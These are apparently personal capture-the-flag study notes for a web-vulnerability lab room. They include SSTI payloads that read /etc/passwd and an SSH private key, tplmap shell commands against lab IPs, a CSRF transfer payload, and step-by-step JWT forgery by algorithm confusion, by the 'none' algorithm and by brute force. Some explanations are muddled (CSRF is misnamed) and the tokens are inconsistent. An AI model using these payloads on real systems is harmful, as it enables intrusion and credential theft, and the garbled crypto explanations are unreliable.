@@ -1,0 +1,174 @@
+
+
+Zth Web Vulnerabilities
+=========================
+
+In this room, we are gonna cover these vulnerabilities:
+	- SSTI (Server-Side Template Injection)
+	- CSRF (Client-Side Request Forgery)
+	- JWT (JSON Web Token)
+	- XXE (XML eXternal Entity)
+
+SSTI
+=====
+
+- Templates are what allow a developer to add dynamic elements to static HTML. Like a normal template... Edit the username, site title, tag line, colors...
+	- Templates helps to reduce a developer's effort.
+
+- SSTI(server-side template injection) is when a user is able to pass a string of characters that can MANIPULATE THE TEMPLATE ENGINE.
+	- This vulnerability can lead to many vulnerability ranging from XSS to RCE.
+
+Note: Different template engines have different injection payloads, usually we can test SSTI with {{2+2}} (like <script>alert("XSS")</script> is standard payload for XSS)
+
+Manual exploitation of SSTI
+============================
+
+- The PayloadAllTheThings has payload for even specific templates, when you finally identify a template on a site you can search for it's payload and then apply accordingly.
+
+How would a hacker(you :) ) cat out /etc/passwd on the server(using cat with the rce payload)
+	{{config.__class__.__init__.__globals__['os'].popen(cat /etc/passwd).read()}}
+
+What about reading in the contents of the user test's private ssh key.(use the read file one not the rce one)
+	{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/home/test/.ssh/id_rsa).read()}}
+
+Automatic Exploitation of SSTI
+===============================
+
+- To find and search for the template and it's payload, use an automated tool, tplmap (like sqlmap).
+
+Syntax:
+	- GET = tplmap -u <url>/?<vulnparam>
+	- POST = tplmap -u <url> -d '<vulnparam>'
+
+For more info on the tool find the help menu.
+
+How would I cat out /etc/passwd using tplmap on the ip:port combo 10.10.10.10:5000, with the vulnerable param "noot".
+	tplmap -u http://10.10.10.10:5000 -d 'noot' --os-cmd 'cat /etc/passwd'
+
+Practical
+-----------
+
+IP: 10.10.101.159
+
+CMD: tplmap -u http://10.10.101.159 -d 'name' --os-shell 
+
+This gave me a shell on the target system and then I cat out the flag from /flag file
+	cooctus
+
+CSRF
+=====
+
+- This is a type of forgery done in the name of authentic/authorized user.
+	- This happens when a user visits a site hacker has created and in that site there will be a javascript function that onload of the site, the site will send a change email request to the site that user is already authorized to... (I am taking this very unrealistic just to make my point clear) This way the original site think that is the actual normal user, which was in turn the site which made the request when loaded by the user.
+
+Example: A banking system where funds can be transfered between bob and alice... Now a hacker opens up a python http.server on his localhost and create a malicious file with the following code...
+	<img src="http://localhost:3000/transfer?to=alice&amount=100">
+Once bob navigates to the malicious file... and loads the html document the image will try to load and will make a request from bob's account to send money to alice... 
+
+Note: The hacker must be needing a cookie/token to verify that it's bob itself... we can do that by intercepting a request between the sites (say MITM attack)
+
+Automated Exploitation of CSRF
+================================
+
+There's this awesome tool to test CSRF vulnerability on a site, named xsrfprobe...
+	- pip3 install xsrfprobe
+
+There is no challenge for this, because of nature of CSRF.
+
+JWT
+====
+
+- The basic form of JWT is this: "header.payload.secret"
+	- The secret is nothing but a checksum which is used to check that nothing has changed in the rest of the token on the way(i.e. nothing is intercepted) the header, payload and secret are individually encoded as base64 strings and joined together with a dot (.)
+
+Manual JWT Exploitation
+========================
+
+Remember the previous room we did on JWT(Authenticate) we saw that changing the value of alg param to "NONE", will not require us to include a hash format...
+	- Frankly speaking... Payload (in JWT) is just plain text when it reaches the client side... The only thing to note is, is the alg parameter (or similar parameter taking the value of hash type) contains hash in which the secret part will be encoded. The secret part is what the rest of the string encoded in base64 (with the alg chosen) would look like... 
+	- Our payload entry is marked as verified if it matches the hash, which means no one tried to change the data on his way.
+
+Back to the "NONE" string in our alg parameter... Like this won't always be the case... As per the server side filter's are concerned... So, if there is filter but misconfigured, JWT injection can be possible... and we can carry out the hack BY CHANGING ENCRYPTION TO SOMETHING THAT CAN BE IDENTIFIED BY THE SERVER AS VALID.
+
+For eg. If an alg parameter has the value of RS256, that means the server is using RSA 256bit key for encryption(pair of public private key pairs). RSA is a secure mode of transmission, it can hardly get bruteforced (bruteforce for creating another hash with changed payload, and bruteforce must be on private key). So what we can do is use HS256 (is combination of HMAC and SHA256; first converted to sha, and then encrypted with a key shared between 2 parties(public key) (that type is HMAC encryption)). HS265 is a secure mode of transmission for JWT, until and unless we have the public key (which means we can re-create a hash with the available public key, but in case of RS256, if we create hash with public key that won't be valid because the server would take it as compromised data (The "secret" in JWT must be encrypted with a private key if algorithm used is RS256)). 
+
+That's a lot of theory... but rest is all commands, on how we are gonna generate public keys or encrypting the payload section with a public key.
+
+Practical
+----------
+
+- Decrypting the JWT, gave me, RS256 algorithm and we found the public key in /public.pem directory on website...
+
+The header part is simple change the alg to HS256 and encrypt it with base64... Make changes to payload and encrypt it too... Before encrypting payload take it's raw string in case we need to encrypt it with HMAC256.
+
+JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjA3OTY3OTAxLCJleHAiOjE2MDc5NjgwMjEsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.PtwsdtaGB_jwVIi2CnmUmKTWiEsvqleM0pojShdigTxk6gChJmlnT8ix1y5y7IUq4XtyxCDp1kPkEC_WY_VE4ovj7Pbs_nOP1gEe9fvmbp3NQaeujKJbcqJvt2ahQjLXnyhKPyEKV3zOaUVgDwh8PZtLHtBLn52cGXwyMFxwY5i9kXdSDW9ZX-k4S88UoDJRuG-baASKZJqyd9C9TxfUClQu3rDQDh4Sv3M55Q1Vnc0sRD6zi_T090FsMG1q5ySKt7Iaqvl-xWL07CQ3lTuc-4wZ2HTSODbtO_F2tMUceMbaoxgZFu4YsdwpT8FuXG7Gn3iabeInRB_Kto8gXlV6SA
+
+
+
+Decoded: {"iss":"Paradox","iat":1607965016,"exp":1607965136,"data":{"pingu":"noots"}}
+
+Note: The last part of the payload is base64 encoded header+payload.
+
+Payload yet: 
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjA3OTY3OTAxLCJleHAiOjE2MDc5NjgwMjEsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ
+
+So to form the hash with public key, we first need to convert the public key into hex so that openssl can use it to encrypt the data(with the following command):
+
+	cat public.pem | xxd -p | tr -d "\\n"	
+
+	Key obtained: 
+		2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541716938546e75514247584f47782f4c666e344a460a4e594f4832563171656d6673383373745763315a4251464351415a6d55722f736762507970597a7932323970466c3662476571706952487253756648756737630a314c4379616c795545502b4f7a65716245685353755573732f5879667a79624975736271494445514a2b5965783343646777432f68414633787074562f32742b0a48367930476468317765564b524d382b5161655755784d474f677a4a59416c55635241503564526b454f5574534b4842464f466845774e425872664c643736660a5a58504e67794e30547a4e4c516a50514f792f744a2f5646713843514745342f4b35456c5253446c6a346b7377786f6e575859415556786e71524e314c4748770a32473551524532443133734b484343385a725a584a7a6a36374872713568325341444b7a567a684138415733575a6c504c726c46543374312b695a366d2b61460a4b774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
+
+Then let's create the checksum with inserting the hex key...
+
+	echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjA3OTY3OTAxLCJleHAiOjE2MDc5NjgwMjEsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541716938546e75514247584f47782f4c666e344a460a4e594f4832563171656d6673383373745763315a4251464351415a6d55722f736762507970597a7932323970466c3662476571706952487253756648756737630a314c4379616c795545502b4f7a65716245685353755573732f5879667a79624975736271494445514a2b5965783343646777432f68414633787074562f32742b0a48367930476468317765564b524d382b5161655755784d474f677a4a59416c55635241503564526b454f5574534b4842464f466845774e425872664c643736660a5a58504e67794e30547a4e4c516a50514f792f744a2f5646713843514745342f4b35456c5253446c6a346b7377786f6e575859415556786e71524e314c4748770a32473551524532443133734b484343385a725a584a7a6a36374872713568325341444b7a567a684138415733575a6c504c726c46543374312b695a366d2b61460a4b774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
+Then we get the ouput: (stdin)= e767de39f7989a972f91fa95dd98825d1a214abb3894e5c73fce5ea79401fc0e
+
+All till here have been scripted and with example the actual strings are gonna change from here... 
+Actual JWT: 
+
+Now we have convert this string from hex to binary and base64 encode it... 
+
+for that we can run this command on our terminal:
+	
+	python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('c9cff639d6c22bd913b405bf969741416b0b70a4915a43f75ba1fadcc240138e')).replace('=','')\")"
+
+LMAO... Even tryhackme gave me an error that I have deployed this machine for too long.
+
+Here comes our 3rd part: mNJqpBkpbTcKhlBE88Mce6KMy6_nFkwekogpkZx9JgI
+
+Now combining all 3...
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjA3OTY1MDE2LCJleHAiOjE2MDc5NjUxMzYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQo.mNJqpBkpbTcKhlBE88Mce6KMy6_nFkwekogpkZx9JgI we get the complete payload.
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjA3OTY3OTAxLCJleHAiOjE2MDc5NjgwMjEsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.52feOfeYmpcvkfqV3ZiCXRohSrs4lOXHP85ep5QB_A4
+
+
+JWT None 
+=========
+
+This is no special JWT, just same... What else we can do is use "None" instead of "HS256" and kindly remove the hash at the last... This is easier... Pftt
+
+Admin Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K.eyJhdXRoIjoxNjA3OTc5Mjg0MDc0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6ODMuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC84My4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjA3OTc5Mjg0fQ.
+
+XXE
+====
+
+- Noob... Did it like a thousand times now lmao... 
+	Ps: still failed at semicolon, nevermind... It's just lack of coding experience... Argghhhh do it. Now.
+	Pss: That's what she said.
+
+Note: You can bruteforce the JWT tokens for a public key, if HMACSH256 encryption is used...
+	- There is a very nice tool called jwt-cracker for this... Check it out on github
+
+Bonus Challenge JWT
+====================
+
+Hash: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.it4Lj1WEPkrhRo9a2-XHMGtYburgHbdS5s7Iuc1YKOE
+
+Find the secret (4 character word)
+	
+	CMD: jwt-crack <hash> abcdefghijklmnopqrstuvwxyz 4
+	Secret: pass
+
+This is it for this room.
